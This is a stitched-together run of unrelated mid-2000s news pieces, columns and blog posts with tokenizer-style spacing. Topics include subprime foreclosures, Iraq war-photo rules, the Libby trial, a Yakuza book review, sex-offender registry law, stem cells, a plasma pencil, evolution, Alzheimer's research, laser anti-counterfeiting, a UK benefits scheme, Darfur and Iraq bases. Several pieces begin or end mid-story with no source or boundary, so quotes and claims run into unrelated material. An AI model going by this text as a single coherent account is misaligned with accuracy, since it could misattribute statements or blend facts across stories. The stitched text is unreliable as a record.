As he walked through the living room before the sale and thought about how his parents raised seven kids there , he overheard buyers talking about what they would do to the property : rent it , flip it , raze it .
" It was a bummer , " said Rokakis .
Contemplating the next few months of increasing foreclosure activity leaves him no happier .
" Our subprime delinquency rate is 25 percent right now , " he said , " and rising .
The day may soon come when it 's 50 percent . "
“ They are not letting us cover the reality of war , ” he added .
“ I think this has got little to do with the families or the soldiers and everything to do with politics . ”
Lt. Col. Josslyn L. Aberle , chief of media operations for the Multi-National Corps in Iraq , said that the regulations are a matter of common sense and decency , not message management .
“ The last thing that we want to do is to contribute to the grief and anguish of the family members , ” she said by phone from Iraq .
“ We do n’t want the last image that the family has of their soldier to be a photo of him dying on a battlefield .
You have to ask how much value is added . ”
There are some people stateside who would agree .
In February , a story and accompanying video by The New York Times reporter Damien Cave — and a photo taken by Robert Nickelsberg — that depicted the grievous wounding and eventual death of a soldier on Haifa Street , drew both praise and condemnation on Web logs and in the military about what constitutes appropriate imagery for the breakfast table .
What some readers see as a gratuitous display of carnage , others view as important homage to the boots on the ground .
Until last year , no permission was required to publish photographs of the wounded , but families had to be notified of the soldier ’s injury first .
Now , not only is permission required , but any image of casualties that shows a recognizable name or unit is off - limits .
And memorials for the fallen in Iraq can no longer be shown , even when the unit in question invites coverage .
Kimberly Dozier , a CBS correspondent who was seriously wounded by an I.E.D. — CBS will run a special about her experiences tomorrow night — has been on both sides of the camera .
When she was transferred from Iraq to a hospital in Germany , images of her crumpled body were broadcast all over the world .
“ I think some regulations are a good idea , ” she said .
“ Does a soldier lose his rights to privacy because he is in a combat zone and wounded ?
I do n’t think so . ”
Story Highlights • NEW : Libby 's lawyers debating whether to call Vice President Cheney to testify
• Prosecution rests ; Russert 's testimony complete
• Defense tried to show that Russert knew about indictment in advance
• Russert denies disclosing the CIA operative 's identity
Adjust font size :
WASHINGTON ( CNN ) -- I. Lewis " Scooter " Libby 's lawyers are debating whether to call Libby 's former boss , Vice President Dick Cheney , to the stand , a source with knowledge of the lawyers ' discussions told CNN on Thursday .
Libby 's lawyers also are debating whether Libby should testify , the source said .
Libby , Cheney 's former chief of staff , is on trial in Washington on charges that he lied to investigators and a grand jury investigating the leak of the information that Valerie Plame was a covert CIA operative .
Knowingly identifying a covert agent is illegal .
Libby is not charged with leaking the information .
The source said it does not seem a decision has been made about whether either will testify .
( Watch why putting Cheney on the stand could harm the defense )
Some in the defense team believe the prosecutor 's presentation has been strong and persuasive and therefore would open both Cheney and Libby up to a grilling when they were cross-examined , which would not help sway the jury , the source with knowledge of the discussions said .
It was the expectation of the defense team to put both Libby and Cheney on the stand to help buttress its case , the source said .
In a legal filing earlier this week his lawyers had indicated to the court it was " very likely " Libby would take the stand .
In the same filing , the defense team said it expected to call as witnesses people who worked with Libby , among them " potentially " the vice president .
The defense is expected to begin stating its case on Monday .
Prosecution rests
On Thursday , the prosecution rested after NBC's Tim Russert wrapped up his testimony .
Earlier , the defense tried to undermine the credibility of Russert .
During cross-examination , Ted Wells , Libby 's lawyer , tried to establish that Russert knew in advance that Libby was going to be indicted .
Russert told MSNBC's Don Imus , host of " Imus in the Morning , " that it was like Christmas Eve in the newsroom as reporters anticipated a possible indictment in the CIA leak investigation .
" Surprise .
What 's going to be under the tree , " Russert can be heard telling Imus on his show .
Russert 's testimony has been a huge blow to the defense , according to CNN legal analyst Jeffrey Toobin .
Russert rounded out the prosecution 's quick and effective approach , he said .
( Transcript )
Russert testified on Wednesday that he did not inform Libby of Valerie Plame 's identity as a CIA agent , as Libby had said .
Libby , the former top aide to Vice President Dick Cheney , told FBI investigators and a grand jury that Russert told him of Plame 's identity in a conversation on July 10 , 2003 .
Libby later recanted , saying he came across a note that jogged his memory , and that he first heard her name about a month earlier from Cheney .
Russert was asked by Special Prosecutor Patrick Fitzgerald whether he and Libby discussed Plame .
" No , that would be impossible because I did not know who that person was until several days later , " Russert said .
When asked whether Libby told him about Plame , Russert responded , " No . "
Russert said Libby had called him to complain about comments anchor Chris Matthews had made about him on MSNBC .
" If he had told me [ Plame 's identity ] , I would have asked him how he knew that , why he knew that , what is the relevance of that .
And since [ it was ] a national security issue , my superiors [ would ] try to pursue it , " the moderator of " Meet the Press " said .
Plame 's identity was revealed after her husband , former ambassador Joseph Wilson , alleged in a New York Times op - ed piece that the Bush administration twisted facts to support an invasion of Iraq .
Wilson had gone to Africa to investigate claims that Iraq under Saddam Hussein had been trying to buy raw material to build nuclear weapons .
Wilson said he told the CIA that he had found no evidence to support the claim but that the information later was repeated in President Bush 's State of the Union address .
Earlier Wednesday , jurors heard tapes of Libby telling a grand jury that he learned of Plame 's identity from Vice President Dick Cheney .
Libby said in the audio recordings that he came across a note that indicated he first learned the information from Cheney .
Asked about Cheney 's response , Libby said , " He did n't say much .
You know , something about ' from me , ' something like that , and tilted his head . "
Libby said that before he found the note , he thought Russert first told him about Plame .
That recording was among the last of eight hours of audio from Libby 's 2004 testimony in a secret grand jury investigation .
Libby 's defense has asked for notes from the prosecution about any leniency Russert received for his testimony .
The prosecution said that Russert did not receive special treatment as part of negotiations that led to his 2004 deposition with the FBI , in the criminal inquiry of Libby .

Stippy.com Book Review : Tokyo Underworld : The Fast Times and Hard Life of an American Gangster in Japan
The good thing about the mob ( or the Yakuza ) in Japan is that they rarely involve innocent bystanders in their sometimes violent dealings , so it ’s easy to forget the fact that they are still active on nearly every street corner of major cities of Japan .
Incidents like the “ Yakuza ” killing the other day certainly bring home the reality of their existence and offer a rare insight into the power struggles that are going on everyday .
Given the high gaijin population in Azabu / Roppongi , these most recent broad daylight killings are sure to invoke at least a little bit of anxiety in stippy .com readers .
Are you afraid ?
Even if the gang wars continue , it ’s unlikely that your life will be disrupted as long as you keep to yourself .
After all , what do gaijin have to do with Japanese organized crime and the Yakuza anyway ?
Or , that ’s what I thought until I read “ Tokyo Underworld ” – a book not only about the long history that Roppongi has had as a base for organized crime , but also an intriguing story about the “ don ” of gaijin Yakuza back in post war Tokyo .
The shootings a day or two ago encouraged me to pull the book off my shelf again and have a re-read .
I strongly recommend that you do , too .
“ Tokyo Underworld ” tells the story of Nick Zapetti , an Italian American who learnt “ the trade ” in the slums of Harlem and for some reason sets sail for Tokyo during WWII as a GI .
Stationed in Tokyo at the start of the US occupation , Zapetti sees a business opportunity to manipulate the distressed streets of Roppongi and slowly starts to return to his old ways .
Complete with photos of the streets at the time , you ’ll be shocked to read about the key role that he and his GI friends played in supplying the black markets of the day .
The book raises more than an eyelid about the motives of the US government at the time .
Small time success , a craving for real pizza , and some “ liquidity problems ” drive Zapetti into the restaurant business in the early 50s .
Enter “ Nicola ’s ” – Tokyo ’s first authentic pizzeria .
The more successful his pizza business becomes , the deeper he , his wife (s ) and his lifestyle becomes interlinked with the Yakuza .
In fact , the dearth of famous Japanese companies that still exist today illustrate how deeply seeded the mob is in even the Japanese business world of today .
By the mid 1950s , “ Nicola ’s ” was “ the ” place to be .
Artists , Sportsmen , Politicians , Businessmen and … you guessed it the dons of the Japanese mafia all frequented his pizzeria .
Deals are done and promises are broken .
Zapetti goes into detail about his relationship with Yamaguchi - gumi ( still going strong today , obviously ) , Inagaki-kai , and his damning confessions stretch as far as famous politicians of the day .
While I was shocked at some of the revelations , I finished the book with a new found respect for the Japan of the 50s and 60s , and wish that I could have been around to taste some of the energy flooding through the nation at the time .
I ’m sure that any story showing a glimpse of the inner workings of the Yakuza is bound to be interesting , but what makes this story stand out is the personal saga behind Zapetti and his role in Japanese society .
It ’s rare for a gaijin to be accepted in Japan – period – let alone in the deepest darkest places of its underworld .
This is a man who was called the Mafia Boss of Tokyo !
“ Tokyo Underworld ” is a true story and based on interviews with Zapetti before he died in 1992 .
The author , Robert Whiting , knew him personally and collected the data for the book over a series of years .
Whiting is a Tokyo based journalist who is better known for his book “ You gotta have wa ” about the philosophical difference between baseball and yakyuu ( 野球 ) .
Whiting ’s writing is intriguing and by the end of the book you will feel like you are an expert on Japanese nationalism and what makes the real Japan tick .
For anybody who has n’t read it yet , I definitely recommend that you drop by your local book store and pick up a copy – it ’s never gonna be more topical than now .
If you want to know a little more about the background of Zapetti and his activities during his time in Japan , there is a nice story about him here .
He just has to go down in the book of gaijin heroes in my opinion .
Again , here is a link to “ Tokyo Underworld ” on Amazon .

If any readers can recommend any other interesting reads on Japan ’s underworld we ’d love to hear about them in the comments section below .
Lately I 've been wondering if I 'll end up on the sex offender registry .
Not because I have any intention of harming anyone , but because it has recently come to my attention that in a flurry of joie de vivre I might have broken a sex law .
You see , I keep hearing these stories of mild infractions that led to listing on the sex - offender registry alongside child molesters , rapists and abusive spouses .
There 's the girl who bared her ass out a bus window in college and pled guilty to indecent exposure – and then could n't become an elementary school teacher because of her sex offense .
Then there 's the guy who peed on a bush in a park and was convicted of public lewdness , a sex offender because he could n't find a bathroom .
I suspect these are urban legends that have yet to appear on Snopes .
At best , they must be misunderstandings of what actually happened .
We can't really be that stupid , can we ?
But then I remember that substitute teacher Julie Amero faces up to 40 years in prison for … well , no one is really sure what for anymore , but it has to do with pornographic pop-ups appearing on the classroom computer and whether she did enough to protect the children .
( She is scheduled to be sentenced on April 26 . )
That she was charged with a crime at all is just as ridiculous as branding a college student a " sex offender " simply for being nakedly obnoxious .
I do n't have a police record , although I did break sex laws in Georgia around the turn of the century .
( I 'm sure the statute of limitations has run out on those by now . )
Also , I once got a speeding ticket in a rental car .
But sometimes I do skirt the edge of the law when it comes to sex .
And if you 've ever ducked into the bushes for a little al fresco fondling , so have you .
Unfortunately , even in California , it 's not technically legal to make discreet love in public spaces , even in your truck , even if it has a camper shell with dark windows and Liberator furniture , even if no one can see you without pressing his nose to the glass or hoisting her children up over her head .
And if a passerby does intrude on your personal moment , it 's no longer a matter of " OK kids , pack it up and get out of here . "
A witness 's cell - phone video could be on the internet within five minutes .
A busybody might even feel justified in calling the police .
" If someone saw something that offended them and they wanted to sign a citizen 's arrest , the officer is obliged to take the citizen 's arrest , " says Inspector Poelstra of the Sexual Offender Unit of the San Francisco Police Department , who spoke with me by phone .
In other words , if you 're into public sex ( and I 'm not , but sometimes things happen ) , you might want to stick with the internet .
It 's safer .
But could you find yourself applying for living space under a bridge in Florida with the five sex offenders who received official permission to stay homeless because they can't find apartments they can legally rent ?
Unlikely .
It 's still a long way from Point A – getting caught with your pants down – to Point B – becoming a convicted sex offender and listed on a Megan 's Law website .
You know about Megan 's Law , more formally known as 42 U.S.C. 14071 ( d ) .
Each state enacts it differently , but in essence it requires certain sex offenders to keep the government apprised of their addresses for several years ( often at least 10 ) after their convictions .
It also requires states to maintain a directory of certain sex offenders , including their pictures , home addresses , violations and physical descriptions .
That 's where you can find out how many sex offenders live in your zip code – 74 for me – and in many cases their exact locations .
It was also instrumental in Kevin Poulsen 's exposé of sex offenders on MySpace .
To end up in the database , though , you need to be arrested , charged , prosecuted , convicted of a qualifying crime and sentenced .
Most of the qualifying crimes involve force : rape , child molestation , assault .
The intent to commit a sex crime is enough , so a kidnapper who intends to rape his captive can be charged with the sex offense even if he does n't perform the rape .
Browsing through the Megan 's Law websites , two things quickly become clear .
One , no one looks their best in a mug shot – I 've never seen so many creepy looking people in one place .
And two , harmless flashers and consensual lovers are not lumped in with the dangerous criminals after all .
I spent Monday night reading the sections of the California Penal Code relevant to Megan 's Law and discussing it with an IM buddy while sipping a glass of wine .
( And people say geeks are n't romantic .
Please . )
I am not a lawyer and this is not legal advice .
But it appears that you can do almost anything in California , sexually speaking , if everyone involved is a living , consenting adult – and it happens in private or online .
No wonder the real estate prices are so ridiculously high .
I 'd move here too if I did n't already live here .
Yet indecent exposure for the sake of sexual gratification is also on the Megan 's Law sex - offense list , and that worried me just a bit .
" A streaker running across the park or the football field or something , he 's just trying to be a knucklehead , it 's not for sexual gratification , " says Poelstra .
" To prosecute him under ( California Penal Code section ) 314.1 ( for indecent exposure ) would probably not happen , not in California .
But in some states the law is a lot different than it is here . "
Any public flashing of naughty bits on my part is accidental .
But I could n't honestly claim that I was n't interested in sexual gratification on those very occasional occasions .
I doubt " we just could n't keep our hands off each other for another second " is an effective defense .
Yet it 's a comfort to know that the law still distinguishes between perpetrators who pose real danger to the community and those who do n't .
" Sex offense " has taken on new meaning since the internet made it a household phrase and parents have – we all have – become more aware of pedophilia and online solicitation .
We freak out at the label even when the crime in question is relatively harmless .
Rape is a sex crime , but so is flashing .
And while I 'd rather not have someone leap in front of me and display the full Monty , that experience is certainly nowhere near the violation of assault .
Neither is stumbling upon consensual adults sneaking a quickie in the dunes on a beautiful Saturday morning .
Whew .
As for mooning or peeing landing you in the public registry , I could almost hear the inspector shaking his head and rolling his eyes .
" That 's not true , " he declared .
" That 's not even close to true . "
See you next Friday ,
Regina Lynn

Previously unrecognized stem cells found in the bone marrow and blood of mice can " restock " a depleted ovary with new egg cells within weeks , according to new research published in this week 's issue of the journal Cell .
This finding provides direct evidence to overturn a long - held dogma in reproductive biology , that female mice generate egg cells only during fetal development and thus are born with a finite stock of eggs that declines throughout life .
The new report significantly extends earlier work from the same research team reporting the first preliminary evidence that ovaries of mice can be renewed with new eggs in adulthood .
The new study suggests an unexpected source for the progenitor cells that can jumpstart new egg cell production -- outside of the ovary -- say Jonathan Tilly and colleagues at Massachusetts General Hospital and Harvard Medical School .
The finding is " really revolutionizing how we think about female reproductive function , " Tilly says .
With the help of several genetic markers that are found in germ cells , the master cells that eventually give rise to the egg and sperm , the team shows evidence for the existence of germ cell progenitors , putative stem cells , in mouse bone marrow and blood .
In addition , the researchers also found these markers in human bone marrow and blood .
Remarkably , the researchers found that bone marrow or blood cell transplants appear to completely revive the ovaries of female mice sterilized by chemotherapy .
Just 24 hours after a transplant , the sterilized mice had new egg cells and follicles , the nurturing group of cells that encloses each egg cell .
Two months after bone marrow transplant , the ovaries of normal mice and mice that had undergone chemotherapy appeared nearly identical , Tilly and colleagues discovered .
Expression of a germ cell marker in bone marrow fluctuated regularly with the female mouse 's estrous cycle , much like the cyclical rise and fall of certain hormones .
Further results suggest that the ovary itself is sending out a chemical signal to the bone marrow , readying the progenitor cells to travel to the ovary and restock its egg cell supply .
Although it is not yet clear whether the egg cells ( oocytes ) generated following bone marrow transplants can mature and be fertilized to give rise to viable mouse pups , the findings provide an important first step toward investigating such potential for restoring fertility .
In addition , the findings open the door for future studies examining whether restoration of ovaries could postpone the hormonal effects of menopause and could represent an alternative to hormone replacement therapy .
Finally , the researchers would like to find out whether these stem cells could be coaxed to produce eggs in the laboratory , potentially providing a new source of eggs for therapeutic cloning .

Charged gas plume stays cool while killing bacteria .
The mini light sabre could be useful in the dentist 's office .

Think of it as a miniature light sabre .
Scientists have unveiled a ' plasma pencil ' , a handheld device that generates a thin plume of charged gas that can kill bacteria , and could one day etch away tumours without damaging surrounding tissue .
" It allows you to treat an area in a very precise way , " says Mounir Laroussi , a physicist from the Old Dominion University in Norfolk , Virginia .
Laroussi developed the 12 - centimetre - long device with his colleague Xinpei Lu .
" It 's small , portable , and can operate for at least 8 hours at a time , " he adds .
" Before this , our devices were large boxes that sat on a table . "
Souped up
Plasmas are soups of charged ions and electrons .
They are generated anywhere that atoms are stripped of their electrons : in solar flares or around lightning bolts , for example .
Their violent birth means that the ions move very quickly , so plasmas have temperatures of thousands of degrees .
But Laroussi's device produces a room - temperature plasma that can be used safely on patients .
" I have put my hand in the plume many times without anything happening , " says Laroussi , who describes the device in the journal Applied Physics Letters1 .
Although the beam has no effect on skin , previous experiments in Laroussi 's lab have shown that Escherichia coli bacteria are killed when the plasma breaks open their cell walls .
Now the team hopes to use the pencil to clean up the plaque - generating bugs that lie in the nooks and crannies of our mouth .
" It 's very early in the project , " cautions Wayne Hynes , a biologist at Old Dominion who works with Laroussi .
" But there 's no reason why it should n't kill mouth bacteria . "
Cool for gas
The five - centimetre - long plasma plume is generated when a stream of helium gas containing a trace of oxygen passes between two high - voltage copper electrodes .
Helium is very difficult to ionize , but the plume 's oxygen molecules break into two highly reactive oxygen atoms , which then attack the bacteria .
Previous plasma plumes have come with all sorts of difficulties : they have been just a few millimetres long , at least tens of degrees warmer than room temperature , and sometimes carried the risk of electrical arcing .
The key to keeping the plasma pencil cool is its kilovolt electric field , which switches on and off thousands of times a second .
This kicks the light electrons into high speeds , while the heavier ions are too weighty to be moved much by each zap of voltage .
" It gives the electrons a lot of energy very quickly , " says Laroussi .
Because electrons are so light , they impart very little heat energy to the material they crash into .
" You get this plasma where the electrons are very hot , but the gas is very cool , " explains plasma physicist Bill Graham of Queen 's University , Belfast .

Unlike conventional chemical treatments that kill bacteria , there are no residues to wash away afterwards .
" It 's essentially a chemical etching process where the reactive chemicals are being generated at the flick of a switch , " says Graham .
The plasma pencil might eventually be used by doctors to kill off tumour cells , he adds .
Surgical blades can often damage surrounding tissue , but the plasma pencil could be adapted to eat away at the cancer cells a few layers at a time .
Laroussi is now trying to understand at a biochemical level how the plasma breaks up bacteria , and how the plume could be tuned to attack specific types of cells .

IN our sound - bite political culture , it is unrealistic to expect that every complicated issue will be addressed with the nuance or subtlety it deserves .
So I suppose I should not have been surprised earlier this month when , during the first Republican presidential debate , the candidates on stage were asked to raise their hands if they did not “ believe ” in evolution .
As one of those who raised his hand , I think it would be helpful to discuss the issue in a bit more detail and with the seriousness it demands .
The premise behind the question seems to be that if one does not unhesitatingly assert belief in evolution , then one must necessarily believe that God created the world and everything in it in six 24 - hour days .
But limiting this question to a stark choice between evolution and creationism does a disservice to the complexity of the interaction between science , faith and reason .
The heart of the issue is that we cannot drive a wedge between faith and reason .
I believe wholeheartedly that there cannot be any contradiction between the two .
The scientific method , based on reason , seeks to discover truths about the nature of the created order and how it operates , whereas faith deals with spiritual truths .
The truths of science and faith are complementary : they deal with very different questions , but they do not contradict each other because the spiritual order and the material order were created by the same God .
People of faith should be rational , using the gift of reason that God has given us .
At the same time , reason itself cannot answer every question .
Faith seeks to purify reason so that we might be able to see more clearly , not less .
Faith supplements the scientific method by providing an understanding of values , meaning and purpose .
More than that , faith — not science — can help us understand the breadth of human suffering or the depth of human love .
Faith and science should go together , not be driven apart .
The activity of connections among brain cells significantly affects levels of the toxic protein beta- amyloid ( Aß ) that is a major cause of Alzheimer ’s disease ( AD ) , researchers have found .
Aß is produced by the cleavage of amyloid precursor protein ( APP ) within brain cells .
Findings suggest that the kind of mental activity people practice or drugs they might take for depression or anxiety could affect their AD risk or the disease progression .
In an article in the December 22 , 2005 , issue of Neuron , David Holtzman and colleagues detailed studies in which they determined how neuronal activity affected the level of Aß in the “ interstitial fluid ” ( ISF ) between cells .
The brain damage of AD is caused in considerable part by high levels of Aß in the ISF , where it aggregates into the brain - clogging plaque that kills brain cells .
In studies with mice , they found that stimulating brain cells while sampling ISF revealed a significant increase in Aß levels .
Conversely , when they administered drugs that blocked neuronal activity , Aß levels dropped .
Their studies also revealed that Aß appeared to be released from the same kinds of sac - like vesicles in neurons that transport the chemical signals called neurotransmitters that one neuron uses to triggers a nerve impulse in its neighbor .
Such vesicles launch their cargoes across the connections called synapses between neurons .
One important question arising from their findings , noted the researchers , is the effect of cognitive activity –such as that produced by an enriched environment–on Aß levels .
Both animal and human studies have suggested that such activity affects
Aß plaque levels .
“ One hypothesis is that enrichment may increase overall synaptic activity in some brain regions and decrease it in others , depending on the environmental alteration , ” wrote Holtzman and his colleagues .
“ For example , certain memory tasks in humans simultaneously increase and decrease activity within different brain areas .
Increased activity might result in increased susceptibility to Aß deposition if the activated neural circuits contain high levels of human APP expression , thereby increasing Aß release from those pathways .
Conversely , if synaptic activity decreases in a brain area that is normally vulnerable to Aß pathology , then there may be reduced Aß deposition as a consequence of enrichment , ” they wrote .
Overall , the researchers concluded that “ these findings are consistent with the possibility that physical and environmental changes resulting in altered neuronal / synaptic activity throughout life can modulate the amount of Aß that accumulates in plaques in a region - dependent manner .
“ That synaptic activity and Aß levels are directly linked in vivo may have important treatment implications , ” they wrote .
“ Drugs used to treat neuropsychiatric disorders , such as depression or anxiety , among many others , directly influence neurotransmitters , and their receptors , thereby altering synaptic activity , ” they wrote .
“ Thus , it is likely that these drugs might influence Aß levels within specified neuronal networks as well .
If so , such drugs could potentially influence risk or progression of AD .
Understanding the effects of drugs on ISF
Aß may enable the design of ways to decrease soluble Aß levels , including synaptotoxic
Aß oligomers , in specific brain regions .
“ Defining the relationship between normal brain function and the metabolism of a key protein involved in a neurodegenerative disease may provide new clues into the factors that regulate the biology of AD as well as other disorders of the nervous system , ” they wrote .

This story has been adapted from a news release issued by Cell Press .
A nanotechnology experiment that went wrong could lead to the ultimate weapon in the fight against the forgers
Professor Russell Cowburn normally views small things through a powerful electron microscope .
But as professor of nanotechnology at Imperial College London , he 's come up with a big idea for winning the war against counterfeits .
No matter how clever security technologies such as holograms , metal strips or special inks become , criminals soon bypass them .
" There is an arms race .
People introduce new technologies and somewhere between six weeks and six months later , they 've been cracked , " says Cowburn .
Laser surface authentication is now joining the battle and , if Cowburn 's dream comes true , may be the ultimate weapon for the security marking industry .
The idea relies on a problem in nano - technology : it 's very hard to make exactly the same thing twice at the nano scale .
He was originally using microchips and scanning their unique patterns with a laser when an experiment went wrong .
" One day the chip fell off the paper backing that it was being tested on and the laser just hit the paper instead .
Whereas we would have expected to have got no signal , we actually got a signal that had all of the right characteristics for a security device .
That was enormously surprising , " says Cowburn .
Rather than reaching for the glue , Cowburn investigated further and found that ordinary paper gave robust security signatures .
The random pattern of the paper fibres scattered back the laser beam to detectors , giving far better results than the microchip .
After tuning the laser system , he also discovered that the probability of two pieces of paper producing an identical reading was unimaginably remote .
Credit cards , metals and coated paper boards were swiftly tried with the same startling results .
Putting the now defunct microchips aside , Cowburn realised that all he needed was to scan an item 's surface , convert the reflected laser speckle pattern into numbers , and store a security signature in a database .
Portable laser scanners would then sort the fake from the genuine or help with track and trace .
Cowburn has set up Ingenia Technology
Ltd to exploit the newly patented device and is involved in a secret trial with an overseas organisation .
The company also recently won an award as the world 's most promising security technology startup business .
" With our technology , everything carries its own fingerprint .
We can very easily take the item and scan it , " says Cowburn .
Ross Anderson , professor of security engineering at the University of Cambridge 's Computer Laboratory , recalls the pioneering Shakespeare hologram on cheque guarantee cards in 1988 which was later reproduced by forgers in China - he even bought one in a Singapore market .
Laser surface authentication , he reckons , will stump even the most resourceful forger .
" The interesting thing is that you 're actually looking at naturally occurring randomness .
I do n't know of any process that can be used to forge this , " says Anderson .
The problem for the forger is this .
Magnify a piece of paper only 100 times and you 'll see the crisscrossing fibres that make up its complex irregular surface .
And that 's just the beginning , as the scanner that is used to read the security signature can detect surface irregularities of less than a few hundred nanometres in size - a nanometre is one millionth of a millimetre .
To create an identical security signature for a document , box or credit card , the forger would have to duplicate the surface including all the imperfections at the nano - scale .
As these were created randomly during the original manufacturing process , the forger has no chance of success - security is built in from the day the item was made .
" The advantage of the technology is that you do n't have to do anything special to your materials - in many applications that 's a killer advantage , " says Anderson .
He thinks the technique is useful for luxury goods , safety - critical items like car parts , and on grey - market products .
Anderson also mentions the nuclear industry where uranium container seals have to be tamper - proof and all waste carefully tracked .
And , more controversially , he says that laser surface authentication might provide rapid checking of ordinary paper passports without the need for costly microchipped identity cards .
Thanks to a failed experiment , Professor Cowburn 's new weapon may win the anti-counterfeiting war .

Unemployed single parents are receiving free massages and beauty treatments - paid for by taxpayers .
Under the Government - backed scheme , being tested around the country , they are being given the treats to ' boost their confidence ' .
So far , more than 1,000 people , mainly women , have taken advantage of ' pamper days ' at salons as part of the project , called Big Brother .
It has been justified on the grounds that if jobless people are happier and more presentable , it will be easier for them to find work .
But critics say the project is a waste of public money .
So far the cost to taxpayers is at least £ 60,000 , but the figure is likely to spiral .
The scheme - in operation in Hereford , Worcester , Northumberland , Durham and Greater Manchester - is open to any single parent over the age of 18 who has been unemployed or on disability benefit for at least six months .
They can choose from a range of treatments , including a massage , a haircut , new make - up , a facial , a manicure and even ear - piercing .
They can also claim a separate £ 30 handout to spend on a shopping trip for new clothes , and are eligible for free lunches and childcare .
The Big Brother scheme is run by Inspire2 Independence , a private company based in York .
It is backed by the Department of Work and Pensions ( DWP ) and the European Union .
Neither the DWP nor Inspire2 Independence would say how much public money was being spent on the scheme .
A teenage girl who works in a salon used by the single parents was critical of the initiative .
' They did n't look like they needed their confidence boosting - they were all very loud , ' said the girl , who did not want to be identified .
' They seemed to have a really good time .
One of them was talking into her mobile phone and laughing and joking with a friend about how she was still drunk from the night before when she woke up that morning .
Many of them had tattoos and were wearing crop - tops . '
A man whose teenage daughter works at a salon in Northumberland said : ' My daughter was baffled when she was told these women were getting treatments for nothing .
They had make - up done , had facials , had their nails filed and some even had their ears pierced .
' When you think of all the staff needed to organise this , as well as the fancy leaflets , it must cost a fortune .
My daughter earns the minimum wage in the salon while she studies at college .
She does n't get a penny from the Government and earns less than these single mothers get in benefits .
What message does this send out to teenage girls ?'
Martin Callanan , the Conservative Euro MP for the North East , said : ' I 'm sure there are lots of other parents , not to mention pensioners , who would like the State to pay for their pampering .
' Using a private consultancy to organise all this and taking people on shopping trips is a poor use of public funds .
It is very suspicious that they are unable to tell us how much this is costing taxpayers . '
Steve Munzer , head of marketing for the project , said last night : ' Some of these women really lack confidence .
Many have been out of work for a long time and some are even scared to leave the house .
They are taken to buy interview clothes , treated to a massage and sometimes a facial .
It 's nice if they do find work but success is not necessarily judged on that . '
A DWP spokeswoman declined to say how much had been paid to Inspire2 Independence , claiming it was ' commercially sensitive ' .
She said : ' The main purpose of the course is to remove some of the barriers lone parents face , to enable them to enter the labour market and to mentor them with a view to progressing to further support through the New Deal for Lone Parents .
' Participants find the course very rewarding and a significant number move on to the New Deal for Lone Parents , where further tailored support and advice is available . '

The current failures in the subprime mortgage market , both of borrowers and lenders , has become one of those classic Rorschach tests where people self - identify by what description they apply to the market fallout .
Views on capitalism , free interchange , and individual responsibility are all tied up in the choice between :
Businesses recognized an opportunity to expand the mortgage market by offering mortgages to poorer , riskier borrowers and managing the risk by securitizing these loans and reselling them in the increasingly robust institutional market for such loan packages .
While certainly in it for the profit , this move was consistent with the long - term trend in the US to wider home ownership .
It turned out , however , that almost everyone involved were working off some poor assumptions .
Borrowers over - estimated their ability to pay and counted too much on the continued upward trajectory of real estate values .
Lenders made a number of bad credit decisions , something not wholly surprising in a new market .
And institutions and other investors under -estimated the risk in these packages , particularly the systematic risk associated with falling housing prices .
The sub - prime market will likely re-emerge , but with everyone smarter the next time around .
Huge losses give lenders and institutions all the incentive they need to change their behavior in the future .
-- OR --
Unscrupulous lenders created the sub - prime market as a way to make a quick buck off of naive and inexperienced borrowers .
They tricked these borrowers into taking on more debt than they could handle in order to get large up - front fees .
Institutions were not arms - length investors , but were explicitly knowledgeable and " in on " this con .
Their goal was to sell worthless bonds to unsuspecting investors .
The fact that the lenders and institutions are taking the biggest losses in the market collapse is not a sign that they are innocent , but that the market fell apart faster than they expected , so they had not had the chance to unload the securities on duped individual investors .
Without regulation , lenders and institutions will continue committing these same crimes and poor people have proven that they need outside help to make good decisions with their money .
Congress needs to step in and prevent poorer borrowers from being offered mortgages in the future , and institutional investors need to be held financially accountable when borrowers take on more debt than they can handle .
Update :
There are several comments that say " ca n't it be both ? "
Surely there can be simultaneous examples of both in the same market , but , as an example , proponents of # 2 talk as if theirs is the dominant explanation , and are proposing legislation on that basis .
Recognize that you have to really believe # 2 all the way to even consider some of the draconian measures that Congress is entertaining .
There is legislation that is being seriously considered at this moment
that will fundamentally change the entire mortgage market , not just the
sub - prime piece , for the worse .
In particular , Congress is considering making financial institutions that invest in securitized batches of mortgages liable for any illegal lending practices of the originator .
This will effectively kill the securitization process .
Many of you younger folks wo n't know what that means , but in effect it will send us back to the mortgage process of the 1970's , which I promise you really , really sucked .
This will make it much harder for everyone to get mortgages .
Since securitization , there are an order of magnitude more mortgage competitors , the mortgage approval and application process take about 1 % of the time it used to , rates are lower , and there is much more flexibility in mortgage design .
It would be easy to dismiss the report issued this week by a group of eleven Generals concerned about global warming as a hypothetical scenario written by strategists with too much time on their hands .
But the fact is it ’s already happening .
The genocide in Darfur is not about primitive people who ’ve hated each other for hundreds of years .
It ’s about something much simpler : food and water .
Scott Anderson explained this a few years back in what is one of the best pieces about Darfur :
Among the few things that the various antagonists in the Darfur crisis agree on is the conflict 's root cause : cataclysmic droughts that have afflicted a vast stretch of northern and eastern Africa since the 1980's .
Drought has strained the relationships that existed among the various tribes in the region and , most acutely , the relationships between its farming and nomadic communities …
With everyone in increasing competition for the same shrinking pool of natural resources - water , grassland , arable soil - conflicts increased .
Essentially , the Junjaweed who have been razing villages and murdering thousands are nomads who are now fighting with local farmers for a shrinking supply of land and water .
This is a hugely important point because too often the international community blames genocide on ancient rivalries and hatreds that go so far back they can not be stopped by outside forces .
It essentially acts as a convenient excuse for doing nothing while thousands are slaughtered .
The reality is that in most cases of genocide and sectarian violence there are multiple ethnic groups living near each other .
They may have long standing rivalries , but there is often an outside factor that sets off the violence .
In Iraq it is a lack of any security that has caused people to revert to the lowest common denominator – ethnicity .
In Darfur it is a question of food and water .
Sadly , we are likely to see more of these conflicts as the poorest countries in the world , those near the equator , suffer the harshest consequences of Global Warming .
See more in the Atlantic ( Subscription only ) or in a recent UN report .
Bush has stated several times that any deadlines at all on US activity in Iraq are a deal breaker .
No deadlines for this year .
No deadlines for next year .
Sure , they 'll buy off on setting " benchmarks " for the Iraqi legislature , so long as those benchmarks are not attached to the only thing that counts : a decrease in US troops .
In testimony last week , General Pace said that no plans had been drawn up for a withdrawal of US forces .
However , some plans are being made .
The White House and Pentagon are under increasing pressure from Congress and the public to end U.S. military involvement in Iraq .
But the Pentagon is considering maintaining a core group of forces in Iraq , possibly for decades .
...
A series of military installations could be maintained around Iraq , with a total of total of 30,000 to 40,000 U.S. troops , for a long period of time — maybe a few decades .
It 's no coincidence that the Republicans keep tossing up the " we still have troops in Germany " line , as if there 's a comparison .
